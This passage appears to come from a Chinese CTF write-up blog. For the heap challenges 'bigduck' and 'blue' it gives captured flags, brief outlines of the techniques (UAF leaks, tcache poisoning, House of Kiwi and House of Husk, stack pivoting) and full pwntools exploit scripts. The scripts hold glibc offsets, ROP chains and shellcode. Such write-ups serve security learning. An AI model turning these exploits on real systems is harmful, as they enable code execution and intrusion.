class=\"line\">lg(<span class=\"string\">&#x27;ADDR&#x27;</span>,(heap_base+<span class=\"number\">0x100</span>))</span><br><span class=\"line\">add() <span class=\"comment\"># 13</span></span><br><span class=\"line\">edit(<span class=\"number\">13</span>,<span class=\"string\">&#x27;/bin/sh\\0&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(helper)*<span class=\"number\">2</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">edit(<span class=\"number\">14</span>,p64(system_addr))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    edit(<span class=\"number\">12</span>,p64(heap_base+<span class=\"number\">0xd30</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">    add()</span><br><span class=\"line\">    edit(<span class=\"number\">15</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"bigduck\"><a class=\"anchor\" href=\"#bigduck\">#</a> bigduck</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444987/Typera/2023/04/fd8d10ea967cd9e8e58b8c6e824fdcd2.png\" alt=\"image-20220619194814107\" /></p>\n<p><strong>flag{afae47ead2452a4b5ba629ec88635a51}</strong></p>\n<p>libc 2.33 下开了沙盒的堆题，其他部分和上题一样。</p>\n<p><strong>思路</strong></p>\n<ol>\n<li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li>\n<li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li>\n<li>House of kiwi 完成栈迁移，执行 shellcode 读取 flag</li>\n</ol>\n<p><strong>exp</strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;192.168.166.147&#x27;</span>,<span class=\"number\">58011</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Choice: &#x27;</span>,<span class=\"built_in\">str</span>(c))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>():</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: \\n&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data,size=<span class=\"number\">0x100</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Content: &#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">heap_leak = uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>))</span><br><span class=\"line\">heap_base = heap_leak &lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_leak&#x27;</span>,heap_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    add() <span class=\"comment\"># 9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>+<span class=\"number\">8</span>):</span><br><span class=\"line\">    dele(i)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,<span class=\"string\">&#x27;u&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1e0c75</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stderr = libc_base + <span class=\"number\">0x1f3680</span></span><br><span class=\"line\">sync = libc_base + <span class=\"number\">0x1e24a0</span> + <span class=\"number\">0x60</span></span><br><span class=\"line\">magic = libc_base + <span class=\"number\">0x529ad</span></span><br><span class=\"line\">helper = libc_base + <span class=\"number\">0x1e1940</span></span><br><span class=\"line\">ret = libc_base + <span class=\"number\">0x0000000000026699</span></span><br><span class=\"line\">rdi = libc_base + <span class=\"number\">0x0000000000028a55</span></span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002a4cf</span></span><br><span class=\"line\">rdx = libc_base + <span class=\"number\">0x00000000000c7f32</span></span><br><span class=\"line\">addr = heap_base + <span class=\"number\">0x400</span></span><br><span class=\"line\"></span><br><span class=\"line\">mmp = flat([</span><br><span class=\"line\">    <span class=\"number\">0</span>,rdi,((addr)&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span>,rsi,<span class=\"number\">0x2000</span>,rdx,<span class=\"number\">7</span>,libc.sym.mprotect,rdi,<span class=\"number\">0</span>,rsi,addr+<span class=\"number\">0x400</span>,rdx,<span class=\"number\">0x100</span>,libc.sym.read,libc_base + <span class=\"number\">0x00000000000506b1</span></span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,mmp)</span><br><span class=\"line\"><span class=\"comment\"># edit(1,mmp)</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">7</span>,p64(heap_leak^(heap_base+<span class=\"number\">0x100</span>)))</span><br><span class=\"line\">add() <span class=\"comment\"># 11</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">add() <span class=\"comment\"># 12</span></span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(helper)*<span class=\"number\">2</span>)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;ADDR&#x27;</span>,(heap_base+<span class=\"number\">0x100</span>))</span><br><span class=\"line\">add() <span class=\"comment\"># 13</span></span><br><span class=\"line\">edit(<span class=\"number\">13</span>,p64(heap_base+<span class=\"number\">0x2a8</span>)+p64(ret))</span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(sync)*<span class=\"number\">2</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">edit(<span class=\"number\">14</span>,p64(magic))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    edit(<span class=\"number\">12</span>,p64(heap_base+<span class=\"number\">0xd30</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">    add()</span><br><span class=\"line\">    edit(<span class=\"number\">15</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># # add()</span></span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">sl(asm(shellcraft.cat(<span class=\"string\">&#x27;/flag&#x27;</span>)))</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028a55 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000112a51 : pop rdx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000c7f32 : pop rdx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000095982 : pop rdx ; ret 0x11</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000093342 : pop rdx ; ret 0xfffc</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002a4cf : pop rsi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002a04c : pop rsp ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000033af2 : pop rsp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000026699 : ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"blue\"><a class=\"anchor\" href=\"#blue\">#</a> blue</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/8e1ce7b9cbee53accfec12b7b98f925a.png\" alt=\"image-20220619194659319\" /></p>\n<p><strong>flag{8c65b8bd2169f2cf662ae9e324aaef66}</strong></p>\n<p>Ubuntu GLIBC 2.31-0ubuntu9.8 的堆题，IO jumps 段不可写，没有办法按传统思路走。</p>\n<p><strong>思路</strong></p>\n<ol>\n<li>利用后门函数，类似 House of botcake 的手法完成堆块重叠的同时 leak 出 libc。</li>\n<li>设置好 House of Husk 的处理函数为 exit</li>\n<li>设置好 exit_hook 的俩个函数分别为 gets 和  <code>svcudp_reply+26</code> 。</li>\n<li>用 House of Kiwi 触发 exit 调用 exit_hook 完成栈迁移执行 shellcode 读取 flag。</li>\n</ol>\n<p><strong>Exp</strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span 